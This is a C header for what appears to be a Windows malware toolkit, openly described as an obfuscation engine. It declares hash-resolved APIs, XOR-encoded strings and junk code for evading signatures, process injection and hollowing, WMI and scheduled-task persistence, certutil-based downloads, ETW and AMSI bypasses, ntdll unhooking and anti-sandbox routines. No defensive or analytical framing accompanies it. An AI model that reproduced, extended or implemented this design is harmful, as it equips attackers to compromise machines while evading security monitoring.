/*
 * Obfuscation Engine Header
 * 
 * All APIs are resolved via djb2 hash to avoid static imports.
 * All strings are XOR-encoded to avoid signature detection.
 */

#ifndef OBF_H
#define OBF_H

#include <windows.h>
#include <stdlib.h>

/* Initialize obfuscated APIs at startup (call once in main/WinMain) */
void obf_init_apis(void);

/* Obfuscated API wrappers — no static imports in IAT */
LPVOID obf_VirtualAllocEx(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect);
BOOL obf_WriteProcessMemory(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);
HANDLE obf_CreateRemoteThread(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
HANDLE obf_OpenProcess(DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId);
UINT obf_WinExec(LPCSTR lpCmdLine, UINT uCmdShow);

/* Obfuscated NT API resolution */
typedef NTSTATUS (WINAPI *pNtSetInfoProc_t)(HANDLE, INT, PVOID, ULONG);
typedef NTSTATUS (WINAPI *pNtQueryInfoProc_t)(HANDLE, INT, PVOID, ULONG, PULONG);
typedef NTSTATUS (WINAPI *pNtUnmapViewOfSection_t)(HANDLE, PVOID);

pNtSetInfoProc_t obf_get_ntsetinfo(void);
pNtQueryInfoProc_t obf_get_ntqueryinfo(void);
pNtUnmapViewOfSection_t obf_get_ntunmap(void);

/* Obfuscated system functions */
void obf_sys_protect_process(void);
void obf_sys_unprotect_process(void);
const char* obf_sys_check_critical_status(void);
void obf_sys_inject_process(void);
void obf_sys_hollow_process(void);
void obf_sys_wmi_persistence(void);
void obf_sys_harden_files(void);
void obf_sys_harden_single_file(const char *filename);
void obf_sys_lolbas_download(const char *url, const char *outPath);
void obf_ensure_scheduled_task(const char *exePath, const char *taskName);

/* === ETW + AMSI Bypass + Reflective Loader === */
void obf_bypass_etw(void);
void obf_bypass_amsi(void);
void obf_hide_thread(void);
void obf_reflective_load(void);

/* === Syscall Direct Invocation + Anti-Sandbox + Ntdll Unhooking === */
void obf_unhook_ntdll(void);
void obf_startup_evasion(void);
void obf_sleep_obfuscated(DWORD milliseconds);
void obf_bypass_etw_syscall(void);
void obf_bypass_amsi_syscall(void);

/* Encoded string accessors for ETW/AMSI */
char* obf_etweventwrite(void);
char* obf_amsiscanbuffer(void);
char* obf_amsiinit(void);
char* obf_amsidll(void);
char* obf_ntsetinfothread(void);

/* Junk code insertion to break signatures */
void obf_junk_delay(void);
void obf_sleep_junk(int ms);

/* Encoded string accessors */
char* get_str(unsigned char *enc, size_t len);
char* obf_ntdll(void);
char* obf_unmap(void);
char* obf_setinfo(void);
char* obf_queryinfo(void);
char* obf_sedebug(void);
char* obf_icacls(void);
char* obf_certutil(void);
char* obf_schtasks(void);
char* obf_ps(void);
char* obf_loadlib(void);
char* obf_getproc(void);
char* obf_getmod(void);
char* obf_enumproc(void);
char* obf_getbasename(void);
char* obf_winexec(void);

/* Global state */
extern int g_critical_protected;

#endif /* OBF_H */
